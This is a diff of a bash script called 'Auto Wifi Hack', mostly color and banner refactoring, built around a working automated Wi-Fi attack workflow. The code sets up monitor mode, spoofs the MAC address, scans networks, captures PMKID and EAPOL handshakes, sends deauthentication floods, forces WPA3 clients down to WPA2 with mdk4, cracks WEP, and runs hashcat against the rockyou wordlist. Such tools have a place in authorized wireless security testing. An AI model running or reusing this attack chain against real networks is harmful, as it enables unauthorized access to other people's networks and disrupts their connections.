@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version=3.6.2 # 28/5/25 04:00
+version=3.6.3 # 28/5/25 15:40
 
 
 ### Changlog ###
@@ -53,80 +53,6 @@ version=3.6.2 # 28/5/25 04:00
 
 
 
-# Colors
-RESET=$'\033[0m'
-GREEN=$'\033[0;32m'
-RED=$'\033[0;31m'
-YELLOW=$'\033[1;33m'
-WHITE=$'\033[1;37m'
-CYAN=$'\033[0;36m'
-
-clear 
-
-# Hide cursor
-tput civis
-trap "tput cnorm; exit" INT TERM
-
-# ASCII banner lines
-banner_lines=(
-"    █████╗ ██╗   ██╗████████╗ ██████╗     ██╗    ██╗██╗███████╗██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗"
-"   ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    ██║    ██║   ██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝"
-"   ███████║██║   ██║   ██║   ██║   ██║    ██║ █╗ ██║██║█████╗  ██║    ███████║███████║██║     █████╔╝ "
-"   ██╔══██║██║   ██║   ██║   ██║   ██║    ██║███╗██║██║██╔══╝  ██║    ██╔══██║██╔══██║██║     ██╔═██╗ "
-"   ██║  ██║╚██████╔╝   ██║   ╚██████╔╝    ╚███╔███╔╝██║██║     ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗"
-"   ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
-)
-
-# Starting row and column
-start_row=4
-start_col=5
-
-# Matrix drop animation
-for ((col=0; col<${#banner_lines[0]}; col++)); do
-    for ((drop=0; drop<${#banner_lines[@]}; drop++)); do
-        for ((line=0; line<=drop; line++)); do
-            char="${banner_lines[line]:col:1}"
-            [[ "$char" == " " ]] && continue
-            row=$((start_row + line))
-            echo -ne "\033[${row};$((start_col + col))H${CYAN}${char}${RESET}"
-        done
-        sleep 0.0003
-    done
-done
-
-# Fix any straggling characters
-for ((i=0; i<${#banner_lines[@]}; i++)); do
-    echo -ne "\033[$((start_row + i));${start_col}H${RED}${banner_lines[i]}${RESET}"
-done
-echo -e "\n${YELLOW}      🔓 v$version ${RESET}"
-# Show cursor
-tput cnorm
-echo -e "\n\n"
-
-
-frames=(
-"   ${CYAN}◉${RESET}       ${GREEN}◉${RESET}       ${CYAN}◉${RESET}   "
-" ${GREEN}◉${RESET}       ${CYAN}◉${RESET}       ${GREEN}◉${RESET} "
-"${CYAN}◉${RESET}       ${GREEN}◉${RESET}       ${CYAN}◉${RESET}"
-" ${GREEN}◉${RESET}       ${CYAN}◉${RESET}       ${GREEN}◉${RESET} "
-"   ${CYAN}◉${RESET}       ${GREEN}◉${RESET}       ${CYAN}◉${RESET}   "
-)
-
-# Animate
-for i in {1..3}; do
-    for frame in "${frames[@]}"; do
-        echo -ne "\r$frame"
-        sleep 0.1
-    done
-done
-
-echo -e "\n\n\n${WHITE}[+] Script Initialized${RESET}"
-# Move to next line when done
-echo
-
-#sleep 500
-
-
 
 
 
@@ -160,9 +86,63 @@ chown -R $UN:$UN $targets_path
 
 
 
+# Colors
+RED=$'\033[1;31m'
+GREEN=$'\033[1;32m'
+ORANGE=$'\033[1;33m'
+BLUE=$'\033[1;34m'
+PURPLE=$'\033[1;35m'
+CYAN=$'\033[1;36m'
+WHITE=$'\033[1;37m'
+
+NEON_BLACK=$'\033[38;5;8m'
+NEON_RED=$'\033[38;5;196m'
+NEON_GREEN=$'\033[38;5;82m'
+NEON_YELLOW=$'\033[38;5;226m'
+NEON_BLUE=$'\033[38;5;21m'
+NEON_PURPLE=$'\033[38;5;201m'
+NEON_CYAN=$'\033[38;5;51m'
+NEON_WHITE=$'\033[38;5;15m'
+
+BOLD=$'\033[1m'
+RESET=$'\033[0m'
+
+
+
+echo
+
+# Hide cursor
+tput civis
+trap "tput cnorm; exit" INT TERM
+
+# ASCII banner lines
+banner_lines=(
+"    █████╗ ██╗   ██╗████████╗ ██████╗     ██╗    ██╗██╗███████╗██╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗"
+"   ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗    ██║    ██║   ██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝"
+"   ███████║██║   ██║   ██║   ██║   ██║    ██║ █╗ ██║██║█████╗  ██║    ███████║███████║██║     █████╔╝ "
+"   ██╔══██║██║   ██║   ██║   ██║   ██║    ██║███╗██║██║██╔══╝  ██║    ██╔══██║██╔══██║██║     ██╔═██╗ "
+"   ██║  ██║╚██████╔╝   ██║   ╚██████╔╝    ╚███╔███╔╝██║██║     ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗"
+"   ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
+)
+
+# Print each line in red
+for line in "${banner_lines[@]}"; do
+    echo -e "${NEON_GREEN}${line}${RESET}"
+done
+
+echo -e "${ORANGE}   🔓 v$version ${RESET}"
+
+# Show cursor
+tput cnorm
+echo -e "\n\n"
+
+
+
+
+
 
 function first_setup() {
-    echo -e "\n\033[1;34m[*] Checking and installing required packages:\033[0m"
+    echo -e "\n${BLUE}[*] Checking and installing required packages:${RESET}"
 
     mandatory_packages=("aircrack-ng" "gnome-terminal" "hashcat" "hcxtools" "gawk" "dbus-x11")
     optional_packages=("wget" "macchanger" "mdk4")
@@ -172,17 +152,17 @@ function first_setup() {
     check_install() {
         local package="$1"
         if ! dpkg -l | grep -q "^ii  $package "; then
-            echo -e "\033[1;33m[!]\033[0m $package not found. Installing..."
+            echo -e "${ORANGE}[!]${RESET} $package not found. Installing..."
             apt-get update -y >/dev/null  2>&1
             if apt-get install -y "$package" >/dev/null  2>&1; then
-                echo -e "\033[1;32m[✔]\033[0m $package installed successfully."
+                echo -e "${NEON_GREEN}    [✔]${RESET} $package installed successfully."
                 return 0
             else
-                echo -e "\033[1;31m[✘] Failed to install $package.\033[0m"
+                echo -e "${RED}    [✘] Failed to install $package.${RESET}"
                 return 1
             fi
         else
-            echo -e "\033[1;32m[✔]\033[0m $package already installed."
+            echo -e "${NEON_GREEN}    [✔]${RESET} $package already installed."
             return 0
         fi
     }
@@ -200,7 +180,7 @@ function first_setup() {
     done
 
     if [ "${#failed_mandatory[@]}" -ne 0 ]; then
-        echo -e "\n\033[1;31m[✘]\033[0m The following mandatory packages failed to install:"
+        echo -e "\n${RED}    [✘]${RESET} The following mandatory packages failed to install:"
         for pkg in "${failed_mandatory[@]}"; do
             echo "   - $pkg"
         done
@@ -209,7 +189,7 @@ function first_setup() {
     fi
 
     if [ "${#failed_optional[@]}" -ne 0 ]; then
-        echo -e "\n\033[1;33m[!]\033[0m The following optional packages failed to install:"
+        echo -e "\n${ORANGE}    [!]${RESET} The following optional packages failed to install:"
         for pkg in "${failed_optional[@]}"; do
             echo "   - $pkg"
         done
@@ -217,39 +197,39 @@ function first_setup() {
     fi
     
 
-    echo -e "\n\n\033[1;34m[*] Verifying wordlists and vendor data:\033[0m"
+    echo -e "\n\n${BLUE}[*] Verifying wordlists and vendor data:${RESET}"
 
     if [ ! -d "$wordlists_dir" ]; then
         mkdir -p "$wordlists_dir"
-        echo -e "\033[1;33m[+]\033[0m Wordlist directory created at $wordlists_dir"
+        echo -e "${ORANGE}    [+]${RESET} Wordlist directory created at $wordlists_dir"
     fi
 
     if [ -f "$rockyou_file" ]; then
-        echo -e "\033[1;32m[✔]\033[0m Found rockyou.txt wordlist."
+        echo -e "${NEON_GREEN}    [✔]${RESET} Found rockyou.txt wordlist."
     else
         if [ -f "$rockyou_gz" ]; then
             gzip -d "$rockyou_gz"
-            echo -e "\033[1;32m[✔]\033[0m Unzipped rockyou.txt."
+            echo -e "${NEON_GREEN}    [✔]${RESET} Unzipped rockyou.txt."
         else
-            echo -e "\033[1;33m[+]\033[0m Downloading rockyou.txt..."
+            echo -e "${ORANGE}    [+]${RESET} Downloading rockyou.txt..."
             wget -q -P "$wordlists_dir" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
             if [ -f "$rockyou_file" ]; then
-                echo -e "\033[1;32m[✔]\033[0m rockyou.txt downloaded."
+                echo -e "${NEON_GREEN}    [✔]${RESET} rockyou.txt downloaded."
             else
-                echo -e "\033[1;31m[✘]\033[0m Failed to download rockyou.txt."
+                echo -e "${RED}    [✘]${RESET} Failed to download rockyou.txt."
             fi
         fi
     fi
 
     if [ -f "$oui_file" ]; then
-        echo -e "\033[1;32m[✔]\033[0m Found OUI vendor file."
+        echo -e "${NEON_GREEN}    [✔]${RESET} Found OUI vendor file."
     else
-        echo -e "\033[1;33m[+]\033[0m Downloading OUI vendor file..."
+        echo -e "${ORANGE}    [+]${RESET} Downloading OUI vendor file..."
         wget -q https://raw.githubusercontent.com/idoCo10/OUI-list-2025/main/oui.txt -O "$targets_path"/oui.txt
         if [ -f "$oui_file" ]; then
-            echo -e "\033[1;32m[✔]\033[0m OUI vendor file downloaded."
+            echo -e "${NEON_GREEN}    [✔]${RESET} OUI vendor file downloaded."
         else
-            echo -e "\033[1;31m[✘]\033[0m Failed to download OUI vendor file."
+            echo -e "${RED}    [✘]${RESET} Failed to download OUI vendor file."
         fi
     fi
     echo -e "\n"
@@ -259,64 +239,64 @@ function first_setup() {
 
 
 function enable_gpu() {
-    echo -e "\033[1;34m[*] Getting GPU details:\033[0m"
+    echo -e "${BLUE}[*] Getting GPU details:${RESET}"
     # Check if running in a VM
     if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
-        echo -e "\033[1;33m[!]\033[0m You are running inside a VM. \e[1mGPU is not available.\e[0m\n\n"
+        echo -e "${ORANGE}    [!]${RESET} You are running inside a VM. ${BOLD}GPU is not available.${RESET}\n\n"
         return 1
     fi
     # Detect GPU
     GPU_INFO=$(lspci -nn | grep -i 'vga\|3d' | grep -i 'nvidia')
 
     if [[ -z "$GPU_INFO" ]]; then
-        echo -e "\n\033[1;31m[✘]\033[0m \e[1;31mNo NVIDIA GPU detected. Skipping GPU setup.\e[0m\n"
+        echo -e "\n${RED}    [✘]${RESET} ${RED}No NVIDIA GPU detected. Skipping GPU setup.${RESET}\n"
         return 1
     fi
     # Extract GPU model
     GPU_MODEL=$(echo "$GPU_INFO" | sed -E 's/.*\[(GeForce [^]]+)\].*/\1/')
-    echo -e "\033[1;32m[✔]\033[0m GPU detected: \033[1;33mNVIDIA $GPU_MODEL\033[0m"
+    echo -e "${NEON_GREEN}    [✔]${RESET} GPU detected: ${ORANGE}NVIDIA $GPU_MODEL${RESET}"
 
     # Check for CUDA
     if command -v nvidia-smi &>/dev/null; then
         CUDA_VERSION=$(nvidia-smi | grep -i "CUDA Version" | awk '{print $6}')
-        echo -e "\033[1;32m[✔]\033[0m CUDA is installed. Version: \e[1;34m$CUDA_VERSION\e[0m"
+        echo -e "${NEON_GREEN}    [✔]${RESET} CUDA is installed. Version: ${BLUE}$CUDA_VERSION${RESET}"
     else
-        echo -e "\n\033[1;33m[!]\033[0m CUDA is not detected."
+        echo -e "\n${ORANGE}    [!]${RESET} CUDA is not detected."
         read -p "Would you like to install CUDA? (Y/n): " response
         if [[ "$response" =~ ^[Yy]$ ]]; then
-            echo -e "\n[~] Installing NVIDIA CUDA drivers..."
+            echo -e "\n    [~] Installing NVIDIA CUDA drivers..."
 	    packages=("linux-headers-amd64" "nvidia-driver" "nvidia-cuda-toolkit")
 	    for package in "${packages[@]}"; do
 		    if ! dpkg -l | grep -q "^ii  $package "; then
-		        echo -e "\n[~] Installing $package..."
+		        echo -e "\n    [~] Installing $package..."
 		        apt install -y "$package"
 		    else
-		        echo -e "\033[1;32m[✔]\033[0m $package is already installed."
+		        echo -e "${NEON_GREEN}    [✔]${RESET} $package is already installed."
 		    fi
 	    done                        
-            echo -e "\n\033[1;33m[!]\033[0m \e[1;33mPlease reboot your system for changes to take effect.\e[0m"
+            echo -e "\n${ORANGE}    [!]${RESET} ${ORANGE}Please reboot your system for changes to take effect.${RESET}"
             return 0
         else
-            echo -e "\n\033[1;33m[!]\033[0m Skipping CUDA installation. GPU will not be used."
+            echo -e "\n${ORANGE}    [!]${RESET} Skipping CUDA installation. GPU will not be used."
             return 1
         fi
     fi
     # Check if Hashcat detects the GPU
     HASHCAT_INFO=$(hashcat -I | grep GPU 2>/dev/null)
     if [[ -n "$HASHCAT_INFO" ]]; then
-        echo -e "\033[1;32m[✔]\033[0m Great! Hashcat detects the GPU and will use it to crack the passwords.\n\n"
+        echo -e "${NEON_GREEN}    [✔]${RESET} Great! Hashcat detects the GPU and will use it to crack the passwords.\n\n"
         return 0
     else
-        echo -e "\n\033[1;31m[✘]\033[0m Hashcat does not detect the GPU."
-        echo -e "\033[1;33m[!]\033[0m Possible reasons:\n   - Missing NVIDIA drivers\n   - OpenCL not installed\n   - CUDA not properly configured"
-        echo -e "\n\033[1;33m[!]\033[0m Skipping GPU setup."
+        echo -e "\n${RED}    [✘]${RESET} Hashcat does not detect the GPU."
+        echo -e "${ORANGE}    [!]${RESET} Possible reasons:\n   - Missing NVIDIA drivers\n   - OpenCL not installed\n   - CUDA not properly configured"
+        echo -e "\n${ORANGE}    [!]${RESET} Skipping GPU setup."
     fi
 }
 
 
 
 function adapter_config() {
-	echo -e "\033[1;34m[*] Changing Wi-Fi adapter to Monitore mode:\033[0m"
+	echo -e "${BLUE}[*] Changing Wi-Fi adapter to Monitore mode:${RESET}"
 	airmon-ng check kill > /dev/null 2>&1   # Kill interfering processes
 
 	# Check known adapters first
@@ -324,15 +304,15 @@ function adapter_config() {
 	    wifi_adapter="wlan1"
 	elif iw dev wlan1mon info &>/dev/null; then
 	    wifi_adapter="wlan1"
-	    echo -e "\e[1m[+] WiFi adapter:\e[0m $wifi_adapter"
-	    echo -e "\033[1;32m[✔]\033[0m The adapter is in monitor mode.\n\n"
+	    echo -e "${BOLD}    [+] WiFi adapter:${RESET} $wifi_adapter"
+	    echo -e "${NEON_GREEN}    [✔]${RESET} The adapter is already in monitor mode.\n\n"
 	    return 0    
 	elif iwconfig wlan0 &> /dev/null; then
 	    wifi_adapter="wlan0"
 	elif iw dev wlan0mon info &>/dev/null; then
 	    wifi_adapter="wlan0"
-	    echo -e "\e[1m[+] WiFi adapter:\e[0m $wifi_adapter"
-	    echo -e "\033[1;32m[✔]\033[0m The adapter is in monitor mode.\n\n"
+	    echo -e "${BOLD}    [+] WiFi adapter:${RESET} $wifi_adapter"
+	    echo -e "${NEON_GREEN}    [✔]${RESET} The adapter is already in monitor mode.\n\n"
 	    return 0
 	else
 	    # Auto-detect WiFi adapter before asking the user
@@ -340,12 +320,12 @@ function adapter_config() {
 	    if [[ -n "$detected_adapter" ]]; then
 	        wifi_adapter="$detected_adapter"
 	    else
-	        echo -e "\033[1;31m[✘]\033[0m WiFi adapter not detected.\n"
+	        echo -e "${RED}    [✘]${RESET} WiFi adapter not detected.\n"
 	        read -p "Please enter your WiFi adapter name: " wifi_adapter
 	        echo
 	    fi
 	fi  	
-	echo -e "\e[1m[+] WiFi adapter:\e[0m $wifi_adapter"
+	echo -e "${BOLD}    [+] WiFi adapter:${RESET} $wifi_adapter"
 	echo -e "[~] Changing $wifi_adapter to monitor mode."
 	airmon-ng start "$wifi_adapter" > /dev/null 2>&1
 
@@ -355,9 +335,9 @@ function adapter_config() {
 	if [[ -n "$mon_adapter" ]]; then
 		# Extract the original adapter name by removing 'mon' from the end
 		wifi_adapter="${mon_adapter%mon}"
-		echo -e "\033[1;32m[✔]\033[0m Success.\n\n"
+		echo -e "${NEON_GREEN}    [✔]${RESET} Success.\n\n"
 	else
-		echo -e "\033[1;31m[✘]\033[0m \e[31mFailed to start $wifi_adapter in monitor mode.\e[0m Check your adapter and try again.\n\n"
+		echo -e "${RED}    [✘] Failed to start $wifi_adapter in monitor mode.${RESET} Check your adapter and try again.\n\n"
 		exit 1
 	fi
 }
@@ -365,7 +345,7 @@ function adapter_config() {
 
 
 function spoof_adapter_mac() {
-    echo -e "\033[1;34m[*] Randomizing Wi-Fi adapter MAC address:\033[0m"
+    echo -e "${BLUE}[*] Randomizing Wi-Fi adapter MAC address:${RESET}"
 
     # Bring interface down
     ifconfig ${wifi_adapter}mon down
@@ -390,8 +370,8 @@ function spoof_adapter_mac() {
     fi
 
     # Output
-    echo -e "[~] Permanent MAC:  $perm_mac ($perm_vendor)"
-    echo -e "\033[1;32m[✔]\033[0m Randomized MAC: $rand_mac ($rand_vendor)"
+    echo -e "    [~] Permanent MAC:  $perm_mac ($perm_vendor)"
+    echo -e "${NEON_GREEN}    [✔]${RESET} Randomized MAC: $rand_mac ($rand_vendor)"
 }
 
 
@@ -404,13 +384,13 @@ function spoof_adapter_mac() {
 
 function network_scanner() {	
         # Scan 15 seconds for wifi networks   
-        countdown_duration=15
+        countdown_duration=4
         gnome-terminal --geometry=110x35-10000-10000 -- bash -c "timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
 
-        echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
+        echo -e "\n\n${BLUE}Scanning available WiFi Networks ($countdown_duration s):${RESET}"
         for (( i=$countdown_duration; i>=1; i-- )); do
             tput cuu1 && tput el
-            echo -e "\e[1;34mScanning for available WiFi Networks:\033[1;31m\033[1m $i \033[0m"
+            echo -e "${BLUE}Scanning for available WiFi Networks:${RED} $i ${RESET}"
             sleep 1
         done
         mv $targets_path/Scan/Scan-$current_date-01.csv $scan_input
@@ -441,10 +421,10 @@ function network_scanner() {
 	echo -e "\nStation MAC:            BSSID:\n$clients_content" >> "$scan_input"
 
 	# Display available WiFi networks
-	echo -e "\n\033[1;33mAvailable WiFi Networks:\033[0m\n"
+	echo -e "\n${ORANGE}Available WiFi Networks:${RESET}\n"
 
 	# Display the scan input file contents with row numbers
-	printf "\033[1m      Name: %-30s Clients: %-1s Encryption: %-1s Channel: %-1s Power: %-1s Signal: %-0s BSSID: %-13s Vendor: %-1s\033[0m\n"
+	printf "${BOLD}      Name: %-30s Clients: %-1s Encryption: %-1s Channel: %-1s Power: %-1s Signal: %-0s BSSID: %-13s Vendor: %-1s${RESET}\n"
 	echo "--------------------------------------------------------------------------------------------------------------------------------------------------"
 
 	declare -A client_counts
@@ -481,32 +461,32 @@ function network_scanner() {
 	    # Convert dBm power values into signal bars representation
 	    signal_strength=$power  # Assuming power is in dBm (negative values)
     	    if (( signal_strength >= -60 )); then
-	        bars="\e[1;32m▂▄▆█\e[0m"  # Excellent
+	        bars="${GREEN}▂▄▆█${RESET}"  # Excellent
 	    elif (( signal_strength >= -70 )); then
-	        bars="\e[1;33m▂▄▆_\e[0m"  # Good 
+	        bars="${ORANGE}▂▄▆_${RESET}"  # Good 
 	    elif (( signal_strength >= -80 )); then
-	        bars="\e[1;35m▂▄__\e[0m"  # Fair
+	        bars="${PURPLE}▂▄__${RESET}"  # Fair
 	    elif (( signal_strength >= -90 )); then
-	        bars="\e[1;36m▂___\e[0m"  # Weak 
+	        bars="${CYAN}▂___${RESET}"  # Weak 
 	    else
-	        bars="\e[1;31m____\e[0m"  # Very Weak 
+	        bars="${RED}____${RESET}"  # Very Weak 
 	    fi
 
 	    # Colorize encryption type using if-elif, replacing with colorized label
 	    temp_encryption=$encryption
 
 	    if [[ "$temp_encryption" == "WPA3" ]]; then
-	        encryption_color="\e[1;31mWPA3\e[0m"  # Red
+	        encryption_color="${RED}WPA3${RESET}"  
 	    elif [[ "$temp_encryption" == "WPA3 WPA2" || "$temp_encryption" == "WPA2 WPA3" ]]; then
-	        encryption_color="\e[91mWPA3 WPA2\e[0m"  # Red
+	        encryption_color="\033[91mWPA3 WPA2${RESET}" 
 	    elif [[ "$temp_encryption" == "WPA2" ]]; then
-	        encryption_color="\e[93mWPA2\e[0m"  # Orange
+	        encryption_color="\033[93mWPA2${RESET}"  
 	    elif [[ "$temp_encryption" == "WPA2 WPA" || "$temp_encryption" == "WPA WPA2" ]]; then
-	        encryption_color="\e[96mWPA2 WPA\e[0m"  # Cyan
+	        encryption_color="\033[96mWPA2 WPA${RESET}"  
 	    elif [[ "$temp_encryption" == "WPA" ]]; then
-	        encryption_color="\e[1;36mWPA\e[0m" 	        
+	        encryption_color="${CYAN}WPA${RESET}" 	        
 	    elif [[ "$temp_encryption" == "OPN" || "$temp_encryption" == "Open" ]]; then
-	        encryption_color="\e[92mOPEN\e[0m"  # Green
+	        encryption_color="\033[92mOPEN${RESET}" 
 	    else
 	        encryption_color="$temp_encryption"  # Default color
 	    fi
@@ -539,9 +519,9 @@ function choose_network() {
         while :; do
             re='^[0-9]+$'
             if ! [[ $row_number =~ $re ]]; then
-                echo -e "\033[1;31m\033[1m\nError:\033[0m Not a valid number."
+                echo -e "${RED}\nError:${RESET} Not a valid number."
             elif (( row_number < 1 || row_number > num_rows )); then
-                echo -e "\033[1;31m\033[1m\nError:\033[0m Row number out of range."
+                echo -e "${RED}\nError:${RESET} Row number out of range."
             else
                 break
             fi
@@ -567,33 +547,33 @@ function choose_network() {
         oui_vendor=$(get_oui_vendor)
 
         # Echo values
-        echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name_original"
+        echo -e "${RED}BSSID Name:${RESET} $bssid_name_original"
         if [[ -n "$oui_vendor" ]]; then
-            echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address - $oui_vendor"
+            echo -e "${RED}MAC Address:${RESET} $bssid_address - $oui_vendor"
         else
-            echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address"
+            echo -e "${RED}MAC Address:${RESET} $bssid_address"
         fi
 
         if [ "$encryption" = "OPN" ]; then
-            echo -e "\033[1;31m\033[1mEncryption:\033[0m none"
+            echo -e "${RED}Encryption:${RESET} none"
         else
-            echo -e "\033[1;31m\033[1mEncryption:\033[0m $encryption"
+            echo -e "${RED}Encryption:${RESET} $encryption"
         fi
-        echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
-        #echo -e "\033[1;31m\033[1mPower:\033[0m $power"        
+        echo -e "${RED}Channel:${RESET} $channel"
+        #echo -e "${RED}Power:${RESET} $power"        
         echo
         echo
 
         if [ "$encryption" = "OPN" ]; then
-            echo -e "\033[1mThe Network is open.\033[0m"
+            echo -e "${BOLD}The Network is open.${RESET}"
             echo -e "Choose different Network.\n"
             continue  
         elif [[ "$encryption" == "WPA3" ]]; then
-            echo -e "\033[1mThe Encryption is "$encryption". This script can't crack it yet.\033[0m"
+            echo -e "${BOLD}The Encryption is "$encryption". This script can't crack it yet.${RESET}"
             echo -e "Choose different Network.\n"
             continue           
         elif [[ "$encryption" == "WEP" ]]; then
-            #echo -e "\033[1mThe Encryption is "$encryption".\033[0m"
+            #echo -e "${BOLD}The Encryption is "$encryption".${RESET}"
 	    crack_wep
             continue                    
         fi
@@ -601,15 +581,15 @@ function choose_network() {
         # Check if we already have the Wi-Fi password for this BSSID
         if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "The Wi-Fi password is:"; then
             wifi_password=$(grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The Wi-Fi password is:" | awk -F': ' '{print $2}' | xargs)
-            echo -e "\033[1;32mPassword already exists for this network!\033[0m"
-            echo -e "\033[1;34mThe Wi-Fi password is:\033[0m \033[1;33m$wifi_password\033[0m\n"
+            echo -e "${GREEN}Password already exists for this network!${RESET}"
+            echo -e "${BLUE}The Wi-Fi password is:${RESET} ${ORANGE}$wifi_password${RESET}\n"
             echo -e "Choose different Network.\n"
             continue 
         fi
 
         # Check if this BSSID was previously marked as failed with Rockyou wordlist   
         if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "Password not cracked with Rockyou wordlist"; then
-            echo -e "\033[1;34mPassword for $bssid_name (BSSID: $bssid_address)\033[0m was already checked and \033[1;31mnot found in Rockyou wordlist.\033[0m\n" 
+            echo -e "${BLUE}Password for $bssid_name (BSSID: $bssid_address)${RESET} was already checked and ${RED}not found in Rockyou wordlist.${RESET}\n" 
             echo -e "Choose different Attack..\n"
             choose_attack
         fi
@@ -617,7 +597,7 @@ function choose_network() {
         # If we only captured the handshake from previous scan
         if [ -d "$targets_path/$bssid_name" ]; then
             if grep -q "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt"; then
-                echo -e "\033[1;32mHandshake found from previous scan.\033[0m\n"
+                echo -e "${GREEN}Handshake found from previous scan.${RESET}\n"
                 pkill aireplay-ng
                 pkill airodump-ng
                 cleanup
@@ -640,7 +620,7 @@ function choose_network() {
 
 
 function validate_network() {
-    echo -e "\e[1mValidating network:\e[0m"
+    echo -e "${BOLD}Validating network:${RESET}"
     
     # Open airodump-ng in a hidden terminal
     gnome-terminal --geometry=105x15-10000-10000 -- script -c "airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"
@@ -651,7 +631,7 @@ function validate_network() {
     for (( i=0; i<20; i++ )); do
         if [ "$(grep -c "$bssid_address" "$targets_path/$bssid_name/airodump_output.txt")" -ge 2 ]; then
             found=1
-            echo -e "\n\e[1;32mNetwork available!\e[0m\n"
+            echo -e "\n${GREEN}Network available!${RESET}\n"
             break
         fi
         echo -n "."  # Show progress dots
@@ -663,7 +643,7 @@ function validate_network() {
     if [ $found -eq 0 ]; then
         pkill aireplay-ng
         pkill airodump-ng
-        echo -e "\e[1;31mNetwork appears to be offline now.\e[0m"
+        echo -e "${RED}Network appears to be offline now.${RESET}"
         another_scan_prompt
     fi
 }
@@ -700,7 +680,7 @@ function devices_scanner() {
 
                     # Print the "Devices Found" header once
                     if [ "$devices_header_shown" = false ]; then
-                        echo -e "\n\033[1;34mDevices Found:\033[0m"
+                        echo -e "\n${BLUE}Devices Found:${RESET}"
                         devices_header_shown=true
                     fi
 
@@ -746,7 +726,7 @@ function capture_handshake() {
         band=""
     fi
 
-    echo -e "\n\033[1;31m\033[1mStarting PMKID attack ->>\033[0m"
+    echo -e "\n${RED}Starting PMKID attack ->>${RESET}"
 
     # Start device scanner in background
     devices_scanner &
@@ -771,19 +751,15 @@ function capture_handshake() {
         hcxpcapngtool -o "$hash_file" "$pcapng_file" &>/dev/null
         deauth_attack
 
-        if [[ -s "$hash_file" ]]; then
-            #pmkid_count=$(grep -c '^WPA\*01\*' "$hash_file")
-            #eapol_count=$(grep -c '^WPA\*02\*' "$hash_file")
-            
+        if [[ -s "$hash_file" ]]; then       
             sta_mac=$(grep -m1 '^WPA\*0[12]\*' "$hash_file" | cut -d'*' -f5 | sed 's/../&:/g; s/:$//' | tr 'a-f' 'A-F')
             sleep 3
 
             if grep -q '^WPA\*01\*' "$hash_file"; then
-                #echo -e "\n\033[1;32m->> Got the PMKID!\033[0m\n"
-		echo -e "\n\033[1;32m->> Got the PMKID!  \033[0m($sta_mac)\n"
+		echo -e "\n${NEON_GREEN}->> Got the PMKID!  ${RESET}($sta_mac)\n"
                 break
             elif grep -q '^WPA\*02\*' "$hash_file"; then
-                echo -e "\n\033[1;32m->> Got the EAPOL handshake!  \033[0m($sta_mac)\n"
+                echo -e "\n${NEON_GREEN}->> Got the EAPOL handshake!  ${RESET}($sta_mac)\n"
                 break
             fi
         fi
@@ -800,7 +776,7 @@ function capture_handshake() {
 
 
     if (( counter == max_tries )); then
-        echo -e "\n\n\e[31mTimeout: No PMKID or EAPOL captured in 120 seconds.\e[0m"
+        echo -e "\n\n\033[31mTimeout: No PMKID or EAPOL captured in 120 seconds.${RESET}"
         another_scan_prompt
         return
     fi
@@ -812,7 +788,7 @@ function capture_handshake() {
 
 
 function mixed_encryption() {
-    echo -e "\033[1mThe Encryption is "$encryption".\033[0m \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\n"
+    echo -e "${BOLD}The Encryption is "$encryption".${RESET} \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\n"
     gnome-terminal --geometry=70x3-10000-10000 -- timeout 95s mdk4 $wifi_adapter"mon" b -n $bssid_name_original -c $channel -w a
     sleep 5
 }
@@ -830,8 +806,8 @@ function crack_wep() {
     mkdir -p "$targets_path/$bssid_name" # Ensure directory is created
     touch "$output_file"
 
-    echo -e "\n\033[1;33mStarting WEP Cracking:\033[0m"
-    echo -e "Monitor the \033[1;36m#Data\033[0m column in the \033[1;32maircrack-ng\033[0m window. You typically need 30K-50K IVs."
+    echo -e "\n${ORANGE}Starting WEP Cracking:${RESET}"
+    echo -e "Monitor the ${CYAN}#Data${RESET} column in the ${NEON_GREEN}aircrack-ng${RESET} window. You typically need 30K-50K IVs."
     
     # Start airodump-ng in a new terminal and get the terminal's PID
     # The 'exec bash' at the end of commands run in gnome-terminal keeps the terminal open after the command finishes, useful for inspection.
@@ -844,7 +820,7 @@ function crack_wep() {
 
     # Check if capture file was created
     if [ ! -f "$targets_path/$bssid_name/$bssid_name-01.cap" ]; then
-        echo -e "\033[1;31mError: Capture file ($targets_path/$bssid_name/$bssid_name-01.cap) not created. Airodump-ng might have failed. Aborting WEP crack.\033[0m"
+        echo -e "${RED}Error: Capture file ($targets_path/$bssid_name/$bssid_name-01.cap) not created. Airodump-ng might have failed. Aborting WEP crack.${RESET}"
